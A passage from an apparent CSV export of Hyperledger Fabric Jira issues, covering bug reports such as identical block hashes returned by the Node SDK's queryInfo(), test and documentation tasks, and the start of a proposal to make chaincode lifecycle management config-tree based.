A) I deleted the orderer ledger folder @ /var/hyperledger/production/orderer

B) Made suggested update to orderer.yaml file in sampleconfig folder - GenesisProfile=SampleDevModeSolo

 

Thanks.

 ",,denyeart,lehors,pvrbharg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf7b:",,,,,,,,,,,,,,,,,,,,,,,denyeart,lehors,pvrbharg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Jan/18 1:30 AM;lehors;Hi,

I tried to reproduce your problem but couldn't. I wonder what you had done before.

I followed the three examples that are now in the README.  I did have some problems but not the same as yours.

On getting the order started for the reconfiguration example, starting the orderer failed because it didn't have the permission to create /var/hyperledger. Then to get the adding organization example going I had to delete the /var/hyperledger/* But that's all. It would help if you could give a bit more info.

Thanks.;;;","14/Feb/18 3:57 AM;Clayton Sims;Are you able to provide more info?   moving to monitor/hold to indicate we are waiting on the originator;;;","14/Feb/18 6:42 AM;pvrbharg;Hi,

My apologies for being slow in my response.

We can have this item closed - as I was able to work-around with my previously posted updates.

The following work captured our success of getting this issue resolved:

https://www.ibm.com/developerworks/cloud/library/cl-add-an-organization-to-your-hyperledger-fabric-blockchain/index.html

Thanks.;;;","15/Feb/18 2:21 AM;denyeart;[~pvrbharg] Glad you got it working.  Are there any example or doc updates you'd recommend to make this easier?

Anything you could help clarify in the example or docs  [~lehors] ?

If not we will close the issue, just wanted to give you both an opportunity to suggest any improvements.;;;","22/Feb/18 12:28 AM;denyeart;Ok, I will close, but feel free to open a new Jira task for any improvements needed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
add unit test for crypto/random.go,FAB-6025,20597,,Story,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,jichen,jichen,jichen,05/Sep/17 4:28 PM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,28/Oct/17 10:43 PM,,,,v1.1.0,,fabric-crypto,,,,,,0,,,,,,,add unit test for crypto/random.go,,jichen,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyf7j:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jichen,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Oct/17 6:45 PM;mastersingh24;https://gerrit.hyperledger.org/r/13131;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Define needed protobuffs to store per collection private data,FAB-6026,20600,20526,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,05/Sep/17 9:08 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,19/Sep/17 11:06 PM,,,,WON'T FIX,,fabric-ledger,,,,,,0,,,,,,,"Private data in the transient store needs to be stored per collection and not per namespace in order for easy retrieval. 

Therefore, we need to define new protobuf messages. ",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf7z:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fabric client: Channel.queryInfo() returns identical hash strings for current and previous blocks,FAB-6027,20601,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,pfuntner,pfuntner,05/Sep/17 9:21 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,01/Nov/17 11:44 PM,v1.0.1,,,v1.1.0,,fabric-peer,,,,,,0,,,,,,,"While trying to use the fabric-client 1.0.0-rc1 package with a Node.js app to get some information from a 1.0 blockchain network, I was using the {{Channel.queryInfo()}} API to get the height of the block and hashes of the current block and previous block, the hashes are identical. They should usually be different, shouldn't they?

 {code:java}
{
""height"": {
""low"": 12,
""high"": 0,
""unsigned"": true
},
""currentBlockHash"": {
""buffer"": {
""type"": ""Buffer"",
""data"": [ 8, 12, 18, 32, 218, 132, 75, 232, 0, 218, 95, 96, 28, 61, 133, 36, 146, 118, 89, 111, 68, 153, 67, 111, 130, 153, 7, 218, 34, 191, 84, 18, 101, 38, 178, 163, 26, 32, 92, 40, 64, 249, 117, 213, 168, 4, 82, 165, 81, 126, 219, 211, 115, 139, 15, 167, 128, 60, 76, 245, 78, 22, 167, 115, 73, 200, 58, 80, 230, 157 ]
},
""offset"": 4,
""markedOffset"": -1,
""limit"": 36,
""littleEndian"": true,
""noAssert"": false
},
""previousBlockHash"": {
""buffer"": {
""type"": ""Buffer"",
""data"": [ 8, 12, 18, 32, 218, 132, 75, 232, 0, 218, 95, 96, 28, 61, 133, 36, 146, 118, 89, 111, 68, 153, 67, 111, 130, 153, 7, 218, 34, 191, 84, 18, 101, 38, 178, 163, 26, 32, 92, 40, 64, 249, 117, 213, 168, 4, 82, 165, 81, 126, 219, 211, 115, 139, 15, 167, 128, 60, 76, 245, 78, 22, 167, 115, 73, 200, 58, 80, 230, 157 ]
},
""offset"": 38,
""markedOffset"": -1,
""limit"": 70,
""littleEndian"": true,
""noAssert"": false
}
}
{code}

I'm attaching:
* a JSON of the result from {{queryInfo()}} since Jira wasn't retaining the leading blanks
* {{package.json}} from {{fabric-client/}} after installing it on the Ubuntu machine where the Node.js application was run","My Node.js app is running on Ubuntu 16.04.2 LTS.

The Blockchain network I originally used was created through an IBM Blockchain service on Bluemix.

Later, I reproduced this issue with a local network running in Docker containers on my Ubuntu machine.",harrisob@us.ibm.com,jeffgarratt,pfuntner,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Sep/17 12:23 AM;pfuntner;blockinfo.js;https://jira.hyperledger.org/secure/attachment/12039/blockinfo.js","05/Sep/17 9:18 PM;pfuntner;package.json;https://jira.hyperledger.org/secure/attachment/12037/package.json","05/Sep/17 9:18 PM;pfuntner;queryInfo.json;https://jira.hyperledger.org/secure/attachment/12036/queryInfo.json",,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf87:",,,,,,,,,,,,,,,,,,,,,,,harrisob@us.ibm.com,jeffgarratt,pfuntner,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Sep/17 12:24 AM;pfuntner;I did the following:
 * Set up a local network on my Ubuntu as per [Use Local Hyperledger Network|https://github.com/IBM-Blockchain/marbles/blob/v4.0/docs/use_local_hyperledger.md] of the Marbles demo chaincode
 * Tested the network with {{query.js}}
 * Used {{query.js}} as a basis for a new application [^blockinfo.js]
 * Ran {{blockinfo.js}} and observed this output:

{code:java}
Create a client and set the wallet location
Set wallet path, and associate user PeerAdmin with application
Check user is enrolled, and set a query URL in the network
Calling queryInfo()
blockchain info: {
 ""height"": {
 ""low"": 3,
 ""high"": 0,
 ""unsigned"": true
 },
 ""currentBlockHash"": {
 ""buffer"": {
 ""type"": ""Buffer"",
 ""data"": [ 8, 3, 18, 32, 142, 65, 206, 83, 210, 110, 120, 84, 145, 10, 67, 108, 26, 97, 168, 234, 207, 1, 209, 99, 197, 10, 157, 163, 138, 80, 166, 224, 142, 238, 51, 241, 26, 32, 80, 38, 156, 193, 20, 9, 87, 220, 118, 36, 0, 235, 171, 17, 189, 123, 106, 170, 67, 209, 57, 144, 67, 26, 227, 41, 254, 199, 165, 17, 144, 8 ]
 },
 ""offset"": 4,
 ""markedOffset"": -1,
 ""limit"": 36,
 ""littleEndian"": true,
 ""noAssert"": false
 },
 ""previousBlockHash"": {
 ""buffer"": {
 ""type"": ""Buffer"",
 ""data"": [ 8, 3, 18, 32, 142, 65, 206, 83, 210, 110, 120, 84, 145, 10, 67, 108, 26, 97, 168, 234, 207, 1, 209, 99, 197, 10, 157, 163, 138, 80, 166, 224, 142, 238, 51, 241, 26, 32, 80, 38, 156, 193, 20, 9, 87, 220, 118, 36, 0, 235, 171, 17, 189, 123, 106, 170, 67, 209, 57, 144, 67, 26, 227, 41, 254, 199, 165, 17, 144, 8 ]
 },
 ""offset"": 38,
 ""markedOffset"": -1,
 ""limit"": 70,
 ""littleEndian"": true,
 ""noAssert"": false
 }
}
{code};;;","07/Sep/17 7:08 AM;harrisob@us.ibm.com;In looking at the NodeSDK code, we do not manipulate the results of the query, results are returned as provided by the fabric peer. Therefore the duplicate results must be coming from the fabric peer side.;;;","27/Oct/17 4:33 AM;jeffgarratt;[~harrisob@us.ibm.com] [~pfuntner] I have tested this on the latest master and cannot reproduce from the peer interface.  Can you reproduce this on the latest?;;;","27/Oct/17 9:46 PM;pfuntner;I don't know how to set up a blockchain with the latest code.  I tried going through the same steps I laid out earlier but I got the same results.

I am leaving IBM today and the email I registered with this Jira server will soon stop working.  Jira doesn't seem to give me a way to change it so I emailed the helpdesk for assistance.;;;","01/Nov/17 11:44 PM;jeffgarratt;[~pfuntner]... I have verified correctness on latest master.. Will go ahead close.  Please reopen if you find it still an issue with latest code.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabric-test: add tests for CouchDB container name-passwoed,FAB-6028,20604,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,AdnanChoudhury,AdnanChoudhury,AdnanChoudhury,05/Sep/17 11:31 PM,30/Jul/19 11:42 AM,28/Oct/23 3:00 AM,30/Jul/19 11:42 AM,,,,,,fabric-quality,,,,,,0,,,,,,,"[https://gerrit.hyperledger.org/r/#/c/11905/
]The above changeset introduces login name and password for CouchDB containers. This capability needs to be tested in the fabric-test. ",,AdnanChoudhury,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf8n:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jul/19 11:42 AM;mastersingh24;Open 1 year or more with no activity ... time to cleanup;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JSDK limited scope of permissions,FAB-6029,20606,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,rickr,rickr,05/Sep/17 11:53 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,20/Oct/17 12:41 AM,WON'T FIX,,,WON'T FIX,,fabric-sdk-java,,,,,,0,,,,,,,See parent FAB-3621,,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6401,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyfaf:",,,,,,,,,,,,,,,,,,,,,,,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Oct/17 12:42 AM;rickr;I think this is a duplicate;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JSDK Event reg. not be relayable,FAB-6030,20607,18136,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,rickr,rickr,05/Sep/17 11:58 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Jan/18 8:11 AM,,,,v1.1.0,,fabric-sdk-java,,,,,,0,,,,,,,,,dhuseby,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyfan:",,,,,,,,,,,,,,,,,,,,,,,dhuseby,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Reporting Bugs section in Contributing.rst document,FAB-6031,20608,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,nickgaski,rameshthoomu,rameshthoomu,06/Sep/17 1:05 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,27/Oct/17 12:10 AM,,,,,,fabric-docs,,,,,,0,,,,,,,"With the recent updates, #fabric-maintainers RC channel become read only to non maintainers. Reporting bugs in contributing.rst has to change.

[http://hyperledger-fabric.readthedocs.io/en/latest/CONTRIBUTING.html#reporting-bugs. |http://hyperledger-fabric.readthedocs.io/en/latest/CONTRIBUTING.html#reporting-bugs]

Please read the below content from the above reference link.

 
{code:java}
 If not, please bump the issue with a comment and request that it be reviewed. You can also post to the #fabric-maintainers channel in chat.{code}
 ",,joe-alewine,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyfav:",,,,,,,,,,,,,,,,,,,,,,,joe-alewine,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Oct/17 12:10 AM;joe-alewine;Has been merged.

 

https://gerrit.hyperledger.org/r/c/13163/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE run forever,FAB-6032,20609,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,06/Sep/17 1:35 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,09/Sep/17 3:43 AM,,,,,,fabric-quality,,,,,,0,quality,,,,,,PTE feature: run forever,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzyfb3:",,,,,,,,,,,,,,,,,,,,,,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Sep/17 3:43 AM;dongming;PTE will run forever when both nRequest and runDur are 0.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add capabilities parsing to the channel config,FAB-6033,20611,19633,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,06/Sep/17 1:43 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,30/Sep/17 3:06 AM,,,,v1.1.0,,fabric-orderer,fabric-peer,,,,,0,common-components,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyfbb:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE fabric-test repo init ,FAB-6034,20613,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,06/Sep/17 2:45 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,09/Sep/17 3:47 AM,,,,,,fabric-quality,,,,,,0,quality,,,,,,PTE fabric-test repo init,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzyfbj:",,,,,,,,,,,,,,,,,,,,,,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Side DB: Test Automation using behave test framework,FAB-6036,20615,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,Nishi,Nishi,06/Sep/17 3:24 AM,23/Jan/20 7:04 AM,28/Oct/23 3:00 AM,23/Jan/20 7:04 AM,,,,,,,,,,,,0,stale-item,,,,,,,,Nishi,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyfbz:",,,,,,,,,,,,,,,,,,,,,,,Nishi,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"09/Sep/17 3:48 AM;Nishi;Submitted patch set : [https://gerrit.hyperledger.org/r/#/c/13285/]

 ;;;","23/Jan/20 7:04 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update BYFN doc,FAB-6039,20619,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,nickgaski,nickgaski,06/Sep/17 5:24 AM,21/Jul/18 3:47 AM,28/Oct/23 3:00 AM,20/Jul/18 11:05 PM,,,,,,fabric-docs,,,,,,0,Documentation,,,,,,There are some disclaimers that are no longer accurate.  Also need to insert better transitions between a few of the manual steps.  Add a small section linking out to a new update page. ,,ChristopherFerris,nickgaski,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzx7cn:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,nickgaski,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Apr/18 9:37 PM;ChristopherFerris;Unclear to me that this is still relevant. Suggest that unless there are specific issues, we close this. [~odowdaibm] [~pandrejko] [~simsc];;;","20/Apr/18 4:47 AM;pandrejko;I'm ok with closing this one - We still have FAB-9253 in the list as well.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Doc on reconfiguring channel at system and app level ,FAB-6040,20620,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,nickgaski,nickgaski,06/Sep/17 5:38 AM,10/Jan/20 1:47 AM,28/Oct/23 3:00 AM,10/Jan/20 1:47 AM,,,,,,fabric-docs,,,,,,1,Documentation,,,,,,"While we have the broad overview of the configtxlator tool through the configtxlator.rst piece, we need to marry this with a running network and a real world example.  This involves creating a new doc that transitions from the BYFN piece and shows the user how to:

Add new org to the existing channel.

Add new org to consortium at the system level.

Use new org to create a second channel",,nickgaski,vu3mmg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyfcn:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,nickgaski,vu3mmg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Feb/18 7:47 PM;vu3mmg;Do we have an example of adding an organization at a consortium level .

Could you please provide pointers to the same .;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabric-SDK-Go doesn't log properly as per the config,FAB-6041,20621,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Baha-sk,Baha-sk,Baha-sk,06/Sep/17 6:11 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,13/Sep/17 10:44 PM,,,,,,,,,,,,0,,,,,,,"Current when changing the client's log level in config.yaml, the peer doesn't log the GO-SDK entries.",,Baha-sk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyfcv:",,,,,,,,,,,,,,,,,,,,,,,Baha-sk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/golang.org/x/crypto-0.1.0,dependabot/go_modules/test/performance/golang.org/x/net-0.7.0,main,dependabot/go_modules/golang.org/x/net-0.7.0,dependabot/go_modules/github.com/prometheus/client_golang-1.11.1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Change chaincode lifecycle management to be config tree based,FAB-6042,20623,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,06/Sep/17 1:20 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,04/Jan/18 2:59 AM,,,,WON'T FIX,,fabric-peer,,,,,,7,sdk,,,,,,"*Today's State*

Chaincode lifecycle governs which chaincodes at which versions are executed by a peer in a channel, as well as their instantiation and endorsement policies.

The current approach to initial instantiation as well as chaincode upgrade, is for a party satisfying the chaincode instantiation policy to send a proposal to a peer with the updated version of the chaincode, which attempts to start the chaincode (if not started), invoke the {{Init}} function for that chaincode, and return the results of this invocation as part of the MVCC RW set of the proposal response.

In the commit path, although not all peers have access to the chaincode being instantiated or upgraded, the instantiation policy is available through the instantiate transaction (and may not be forged without corrupting the hash computations in the chaincode spec). The peers verify that this instantiation policy is satisfied and that the RW set does not maliciously manipulate the LSCC space.  Finally, the peers perform standard validation checks like MVCC validation.

This current behavior is undesirable for some use cases. In particular, depending on the instantiation policy as the sole gatekeeper for changes to a chaincode's version may be insufficient. Just because a chaincode is available on a peer does not necessarily imply that the channel wishes to have that chaincode utilized within the channel. Thus, the instantiation policy does a good job of protecting the chaincode from being instantiated in channels where it should not be, but additional control is needed in the other direction.

Because chaincode lifecycle is part of the transaction validation path, any modifications here will be non-backwards compatible and must therefore be gated behind FAB-5999.
----
*New Lifecycle Proposal*

The chaincode lifecycle is implemented as an endorser transaction, because it modifies the state database. However, all of the real validation of the instantiation is actually done in an ad-hoc psuedo-simulation style in the VSCC. Therefore, it makes sense to remove the endorsement step, and simply perform all validation during the commit phase.

The channel config already supports this style of zero-endorsement, validation-only transactions with multiple signatures, so it is a natural fit for managing chaincode lifecycle. However, unlike channel config operations which are processed by the orderer, chaincode lifecycle falls entirely within the scope of of the peer and should not require (nor is it desirable to require) the orderer's involvement for these operations.

Therefore, we propose a new configuration tree for the peer with the following structure
{noformat}
<Resources>
    <Chaincodes>
        <Chaincode1>
            (ID) : {
                CodeHash
                InstalledVersion
            }
